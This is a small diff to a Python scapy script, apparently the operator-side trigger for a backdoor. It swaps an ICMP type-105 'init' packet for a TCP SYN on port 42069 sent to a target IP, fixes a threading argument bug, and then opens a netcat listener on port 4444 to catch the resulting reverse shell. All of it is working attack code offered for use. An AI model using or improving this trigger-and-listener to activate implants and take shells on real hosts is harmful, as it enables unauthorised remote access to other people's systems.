@@ -6,15 +6,15 @@ import sys
 
 def send_init_packet(ip):
     sleep(2)
-    packet = IP(dst=ip)/ICMP(type=105,code=1)
-    send(packet)
+    packet = IP(dst=ip)/TCP(sport=42069, dport=42069, flags='S')
+    send(packet, verbose=False)
 
 def main():
     args = sys.argv
     if len(args) < 2:
         print("Please provide IP")
         return
-    thread = threading.Thread(target=send_init_packet, args=(args[1]))
+    thread = threading.Thread(target=send_init_packet, args=(args[1],))
     thread.start()
     system("nc -nlvp 4444")
 
